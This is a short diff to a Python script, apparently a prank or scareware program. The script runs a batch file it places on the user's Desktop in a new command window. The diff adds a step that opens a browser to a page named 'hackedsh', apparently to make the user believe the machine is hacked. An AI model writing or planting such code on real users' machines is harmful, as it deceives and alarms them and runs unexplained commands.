@@ -1,4 +1,6 @@
 import os
+import webbrowser
+import time
 
 Desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
 def klebjeb():
@@ -34,6 +36,12 @@ def delete_klebjeb():
 
 def PopUp():
     os.system("start cmd /k "+Desktop+"\\0kleb0.bat")
+    os.environ["BROWSER"] = "default"
+    time.sleep(1)
+    try:
+        webbrowser.open("https://hackedsh.netlify.app/")
+    except Exception as e:
+        print(e)
 
 klebjeb()
 PopUp()
